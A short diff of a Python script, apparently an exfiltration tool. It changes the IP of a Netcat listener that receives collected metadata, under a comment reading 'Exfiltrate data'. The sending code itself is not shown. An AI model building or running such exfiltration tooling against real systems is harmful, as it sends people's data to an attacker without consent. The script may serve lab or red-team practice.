@@ -94,7 +94,7 @@ if __name__ == "__main__":
     metadata_json = json.dumps(metadata, indent=4)
 
     # Define Netcat listener's IP and port
-    nc_host = "192.168.100.2"  # Replace with your listener's IP
+    nc_host = "192.168.100.19"  # Replace with your listener's IP
     nc_port = 9001             # Replace with your listener's port
 
     # Exfiltrate data
